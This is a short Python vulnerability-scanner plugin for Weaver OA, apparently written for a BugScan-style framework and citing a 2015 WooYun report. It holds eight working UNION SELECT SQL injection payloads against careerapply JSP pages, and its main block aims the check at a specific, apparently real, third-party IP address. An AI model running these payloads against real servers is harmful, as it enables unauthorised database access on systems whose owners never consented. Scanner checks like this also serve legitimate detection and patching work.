#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0136818


import re

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    payloads = [
        'pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
        'pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
        'pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6',
        'pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6',
        'web/careerapply/HrmCareerApplyPerEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
        'web/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6%2C7',
        'web/careerapply/HrmCareerApplyWorkEdit.jsp?id=1%20union%20select%201%2C2%2C3%2Cdb_name%281%29%2C5%2C6',
        'web/careerapply/HrmCareerApplyWorkView.jsp?id=1%20union%20select%201%2C2%2C3%2C4%2C5%2Cdb_name%281%29'
        ]
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code ==200 and 'master' in res :
            security_hole(url + "   :sql Injection")
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa','http://222.76.205.252:99/')[1])